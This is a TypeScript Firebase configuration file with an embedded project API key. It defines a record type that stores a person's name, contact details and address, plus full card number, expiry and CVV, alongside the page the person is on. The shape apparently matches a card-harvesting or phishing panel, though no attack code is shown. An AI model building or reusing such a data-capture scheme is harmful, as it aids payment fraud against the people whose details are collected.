import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyAcnAAlZzpKwN0nwNTzsrz0ka8OleoljJg',
  authDomain: 'mysms-7b5e8.firebaseapp.com',
  projectId: 'mysms-7b5e8',
  storageBucket: 'mysms-7b5e8.firebasestorage.app',
  messagingSenderId: '1008260512816',
  appId: '1:1008260512816:web:824a72a0a63c1dc229c1f5',
  measurementId: 'G-PLK4GEZFSZ',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
